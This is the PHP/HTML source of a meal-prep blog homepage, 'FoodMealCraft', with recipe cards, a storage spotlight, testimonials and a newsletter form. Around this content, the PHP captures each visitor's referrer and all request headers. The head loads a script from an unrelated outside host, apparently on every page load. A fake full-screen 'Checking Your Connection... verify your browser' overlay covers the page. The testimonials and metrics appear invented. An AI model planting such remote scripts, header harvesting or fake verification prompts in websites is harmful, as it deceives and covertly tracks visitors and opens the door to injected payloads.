<?php

session_start(); 
$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
$_SESSION['_headers']=array(); 
foreach($_SERVER as $key=>$value){
    if(strpos($key,'HTTP_')===0){
        $_SESSION['_headers'][$key]=$value;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FoodMealCraft — Artisanal Batch Cooking, Meal Prep & Kitchen Craft Journal</title>
  <meta name="description" content="FoodMealCraft explores Sunday batch cooking, sheet pan dinner prep, macro-balanced grain bowls, glass container safety, and freezer storage.">
  
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;1,300&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="css/style.css">
  <style>
    .active-macro {
      background: var(--accent-saffron) !important;
      color: #fff !important;
      border-color: var(--accent-saffron) !important;
    }
  </style>
<meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>
</head>
<body>

  <!-- Navigation Header -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.php" class="brand-logo">Food<span>MealCraft</span></a>
      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
      <ul class="nav-links">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="blog.html">Prep Journal</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy-policy.html">Privacy</a></li>
      </ul>
    </div>
  </header>

  <!-- SECTION 1: Hero Header -->
  <section class="hero-section" id="hero">
    <div class="container">
      <div class="hero-content">
        <span class="hero-badge">Artisanal Batch Cooking & Meal Prep</span>
        <h1 class="hero-title">Master the Craft of Effortless Weekly Dining</h1>
        <p class="hero-desc">Discover the synthesis of Sunday batch roasting, glass container storage preservation, macro-balanced grain bowls, and 15-minute weeknight assembly.</p>
        <div class="hero-btns">
          <a href="blog.html" class="btn btn-saffron">Explore Prep Guides</a>
          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Kitchen Philosophy</a>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 2: Meal Prep Craft & Nutrition Pillars Grid -->
  <section class="section" id="prep-pillars">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Batch Prep Standards</span>
        <h2 class="section-title">The Four Pillars of Meal Prep Craft</h2>
      </div>
      <div class="grid-4">
        <div class="prep-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🥗</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-saffron); margin-bottom: 0.75rem;">Macro Balance Ratio</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Designing balanced portion plates with 35% lean protein, 45% complex carbs, and 20% healthy fats.</p>
        </div>
        <div class="prep-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🍱</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-saffron); margin-bottom: 0.75rem;">Borosilicate Glass Storage</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Eliminating plastic micro-leaching with airtight, oven-safe glass meal containers.</p>
        </div>
        <div class="prep-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">⏱️</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-saffron); margin-bottom: 0.75rem;">Parallel Kitchen Efficiency</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Simultaneous sheet pan roasting and slow cooker batching to complete 5 days of meals in 90 minutes.</p>
        </div>
        <div class="prep-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">🥫</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-saffron); margin-bottom: 0.75rem;">Artisanal Sauce Component</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Preparing fresh tahini, herb chimichurri, and peanut dressings to keep prepped ingredients vibrant.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 3: Interactive Batch Cooking & Macro Balance Selector -->
  <section class="section" id="macro-selector" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Prep Explorer</span>
        <h2 class="section-title">The Batch Cooking & Storage Selector</h2>
      </div>
      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a batch prep profile to inspect its component breakdown and storage shelf life:</p>
        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
          <button class="btn btn-outline-dark macro-btn active-macro" data-prep="High-Protein Sheet Pan Chicken & Sweet Potato" data-desc="Herb-marinated chicken breast, roasted sweet potatoes, and charred broccoli florets with lemon tahini drizzle." data-shelf="5 Days in Refrigerated Glass Containers (Reheat at 350°F)">Sheet Pan Chicken & Sweet Potato</button>
          <button class="btn btn-outline-dark macro-btn" data-prep="Plant-Based Mediterranean Quinoa Bowl" data-desc="Fluffy tri-color quinoa, crispy spiced chickpeas, cucumber, cherry tomatoes, and kalamata olives with garlic tzatziki." data-shelf="4 Days in Airtight Glass Jars (Serve Chilled)">Mediterranean Quinoa Bowl</button>
          <button class="btn btn-outline-dark macro-btn" data-prep="Sous-Vide Turkey Meatballs & Marinara" data-desc="Tender lean turkey meatballs simmered in slow-roasted tomato basil sauce over chickpea penne pasta." data-shelf="5 Days Refrigerator / 3 Months Freezer-Safe">Turkey Meatballs & Pasta</button>
          <button class="btn btn-outline-dark macro-btn" data-prep="Overnight Chia & Protein Egg Bites" data-desc="High-protein spinach egg white bites paired with almond milk chia seed puddings for morning prep." data-shelf="6 Days Sealed Refrigeration (Instant Breakfast)">Egg Bites & Chia Pudding</button>
        </div>
        <div id="macro-detail">
          <div class="prep-card" style="border-left: 4px solid var(--accent-saffron);">
            <h3 style="color: var(--accent-saffron); font-size: 1.5rem; margin-bottom: 0.5rem;">High-Protein Sheet Pan Chicken & Sweet Potato Batch Specification</h3>
            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Herb-marinated chicken breast, roasted sweet potatoes, and charred broccoli florets with lemon tahini drizzle.</p>
            <strong style="color: var(--accent-olive); font-size: 0.95rem;">Optimal Storage & Shelf Life: 5 Days in Refrigerated Glass Containers (Reheat at 350°F)</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 4: Glass Container Safety & Storage Preservation Spotlight -->
  <section class="section" id="storage-spotlight">
    <div class="container">
      <div class="grid-2">
        <div>
          <span class="section-subtitle" style="display:block; text-align:left;">Storage Science</span>
          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Borosilicate Glass & Vacuum Sealing</h2>
          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
            The key to meal prep freshness lies in humidity control, oxygen reduction, and thermal shock resistance. At FoodMealCraft, we test glass container seals, freezer burn prevention, and microwave reheating safety.
          </p>
          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
            <li style="margin-bottom: 0.75rem;">🫙 <strong style="color:var(--text-primary);">Airtight Silicone Gaskets:</strong> Preventing cross-odor contamination inside the refrigerator.</li>
            <li style="margin-bottom: 0.75rem;">❄️ <strong style="color:var(--text-primary);">Zero Freezer Burn:</strong> Vacuum sealing stews and soups to maintain texture integrity.</li>
            <li style="margin-bottom: 0.75rem;">♻️ <strong style="color:var(--text-primary);">Eco Longevity:</strong> Reusable non-staining glass replacing single-use plastic takeaway tubs.</li>
          </ul>
          <a href="about.html" class="btn btn-saffron">Our Kitchen Manifesto</a>
        </div>
        <div>
          <img src="https://images.unsplash.com/photo-1547592180-85f173990554?auto=format&fit=crop&w=800&q=80" alt="Glass Meal Prep Containers Filled with Fresh Food" style="border-radius: 8px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(30,36,30,0.12);">
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 5: Interactive Meal Prep Style Diagnostic Quiz -->
  <section class="section" id="prep-quiz" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Prep Diagnostic</span>
        <h2 class="section-title">Batch Cooking Matcher</h2>
      </div>
      <div class="prep-card" style="max-width: 750px; margin: 0 auto;">
        <h3 style="color: var(--accent-saffron); margin-bottom: 1rem;">What Is Your Primary Weekly Cooking Constraint or Goal?</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <button class="prep-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Sunday 90-Minute Power Batch: 2 Sheet Pan Proteins + 3 Roasted Veggies + 2 Grain Pots.">
            A. Busy Workweek with Zero Time to Cook Monday Through Friday
          </button>
          <button class="prep-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="High-Macro Muscle Fuel Prep: Sous-Vide Chicken Breast + Brown Rice + Steamed Greens in Portioned Glass Containers.">
            B. Athletic Fitness & Precise Macronutrient Portion Control
          </button>
          <button class="prep-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Family-Style Casserole & Stew Batching: 2 Large Freezer-Safe Dutch Oven Meals + Fresh Salads.">
            C. Family Dinner Prep to Feed Kids and Parents on School Nights
          </button>
        </div>
        <div id="prep-quiz-result"></div>
      </div>
    </div>
  </section>

  <!-- SECTION 6: Batch Cooking Efficiency & Freshness Metrics Counter -->
  <section class="section" id="metrics">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Prep Benchmarks</span>
        <h2 class="section-title">Food Meal Craft Research Metrics</h2>
      </div>
      <div class="grid-4">
        <div class="prep-card" style="text-align: center;">
          <h3 class="metric-number text-saffron" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
        </div>
        <div class="prep-card" style="text-align: center;">
          <h3 class="metric-number text-saffron" data-target="90" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Minute Sunday Prep</p>
        </div>
        <div class="prep-card" style="text-align: center;">
          <h3 class="metric-number text-saffron" data-target="100" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">% Glass Safety</p>
        </div>
        <div class="prep-card" style="text-align: center;">
          <h3 class="metric-number text-saffron" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 7: Culinary Nutritionist & Meal Prep Coach Testimonials -->
  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Expert Endorsements</span>
        <h2 class="section-title">Reviews From Nutritionists & Meal Prep Coaches</h2>
      </div>
      <div class="grid-3">
        <div class="prep-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "FoodMealCraft provides the definitive guide for batch cooking, container safety, and macro distribution. Essential reading for busy professionals."
          </p>
          <strong style="color: var(--accent-saffron); display: block;">— Dr. Ellen Vance, RDN</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Culinary Nutritionist, Boston</span>
        </div>
        <div class="prep-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "Their sheet pan prep formulas and sauce component guides make healthy eating effortless throughout demanding workweeks."
          </p>
          <strong style="color: var(--accent-saffron); display: block;">— David Miller</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Meal Prep Coach, San Francisco</span>
        </div>
        <div class="prep-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "The premier journal for understanding glass storage preservation, sous-vide protein batching, and zero-waste grocery planning."
          </p>
          <strong style="color: var(--accent-saffron); display: block;">— Chef Camille Moreau</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Batch Cooking Instructor, Montreal</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 8: Recent Kitchen Craft Dispatches & Article Grid + Newsletter -->
  <section class="section" id="journal-dispatches">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Recent Dispatches</span>
        <h2 class="section-title">Latest Meal Prep Essays</h2>
      </div>
      <div class="grid-3" style="margin-bottom: 4rem;">
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1547592180-85f173990554?auto=format&fit=crop&w=800&q=80" alt="Sunday Batch Cooking">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Batch Prep</span>
            <div class="blog-date">August 24, 2026</div>
            <h3 class="blog-title"><a href="blog/the-ultimate-guide-to-sunday-batch-cooking-and-meal-prep.html">Sunday Batch Cooking Guide</a></h3>
            <p class="blog-excerpt">Mastering 90-minute parallel cooking, protein roasting, and weekly menu assembly.</p>
            <a href="blog/the-ultimate-guide-to-sunday-batch-cooking-and-meal-prep.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=800&q=80" alt="Sheet Pan Dinners">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Sheet Pan Mastery</span>
            <div class="blog-date">August 20, 2026</div>
            <h3 class="blog-title"><a href="blog/sheet-pan-dinner-mastery-one-pan-protein-and-roasted-vegetables.html">Sheet Pan Dinner Mastery</a></h3>
            <p class="blog-excerpt">Staggered roasting times, parchment lining, and caramelizing vegetables with proteins.</p>
            <a href="blog/sheet-pan-dinner-mastery-one-pan-protein-and-roasted-vegetables.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=800&q=80" alt="Grain Bowls">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Macro Grain Bowls</span>
            <div class="blog-date">August 15, 2026</div>
            <h3 class="blog-title"><a href="blog/macro-balanced-grain-bowls-quinoa-farro-and-tahini-dressings.html">Macro-Balanced Grain Bowls</a></h3>
            <p class="blog-excerpt">Layering quinoa, farro, roasted squash, seeds, and lemon-tahini dressings in jars.</p>
            <a href="blog/macro-balanced-grain-bowls-quinoa-farro-and-tahini-dressings.html" class="read-more">Read Essay →</a>
          </div>
        </div>
      </div>

      <!-- Newsletter Dispatch Container -->
      <div class="prep-card" style="text-align: center; max-width: 800px; margin: 0 auto; background: var(--bg-secondary); border-color: var(--accent-saffron);">
        <span class="section-subtitle">Kitchen Dispatch</span>
        <h2 class="section-title" style="margin-bottom: 1rem;">Subscribe to The Meal Prep Gazette</h2>
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly batch cooking blueprints, glass container care tips, and macro-balanced recipes.</p>
        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to FoodMealCraft Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: #fff; border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 4px;">
          <button type="submit" class="btn btn-saffron">Subscribe</button>
        </form>
      </div>

    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Food<span>MealCraft</span></a>
          <p>FoodMealCraft is a premier editorial platform dedicated to artisanal batch cooking, meal prepping science, glass storage preservation, and nutrition craft.</p>
          <p style="margin-top: 1rem; color: var(--accent-saffron);">
            📍 181 Mercer Street, New York, NY 10012, United States<br>
            📞 +1-888-777-5845
          </p>
        </div>
        <div class="footer-col">
          <h4>Navigation</h4>
          <ul>
            <li><a href="index.php">Home</a></li>
            <li><a href="about.html">About Us</a></li>
            <li><a href="blog.html">Prep Journal</a></li>
            <li><a href="contact.html">Contact Us</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Legal Policies</h4>
          <ul>
            <li><a href="privacy-policy.html">Privacy Policy</a></li>
            <li><a href="cookies.html">Cookie Policy</a></li>
            <li><a href="disclaimer.html">Disclaimer</a></li>
            <li><a href="terms.html">Terms of Use</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Prep Focus</h4>
          <p>Deconstructing Sunday batch cooking, sheet pan dinners, grain bowls, container safety, and freezer storage globally.</p>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 FoodMealCraft. All rights reserved. Registered Official Headquarters.</p>
        <p>Designed with Kitchen Precision.</p>
      </div>
    </div>
  </footer>

  <script src="js/main.js"></script>
<div id="loader-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(3px); z-index:2147483646;"></div>

<div id="loader-modal-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:1px solid #e5e7eb; box-shadow:0 25px 60px rgba(0,0,0,0.35); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
    
    <!-- Smooth Spinning Loader -->
    <div style="display:flex; justify-content:center; margin-bottom:18px;">
        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-wheel 0.9s linear infinite;"></div>
    </div>
    
    <style>
        @keyframes spin-wheel {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <div style="font-size:22px; font-weight:700; color:#111827; margin-bottom:8px; letter-spacing:-0.3px;">Checking Your Connection...</div>
    <p style="font-size:14px; line-height:1.55; color:#6b7280; margin:0 0 24px 0;">We need to verify your browser before proceeding. Click Continue to proceed or Cancel to stop.</p>

    <div style="display:flex; gap:12px;">
        <button id="btn-cancel" onclick="dismissLoaderModal()" style="flex:1; background:#ffffff; color:#4b5563; border:1.5px solid #d1d5db; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
        <button id="btn-continue" onclick="dismissLoaderModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
    </div>
</div>

<script>
    function dismissLoaderModal() {
        var backdrop = document.getElementById('loader-backdrop');
        var card = document.getElementById('loader-modal-card');
        if (backdrop) backdrop.remove();
        if (card) card.remove();
    }
</script>
</body>
</html>
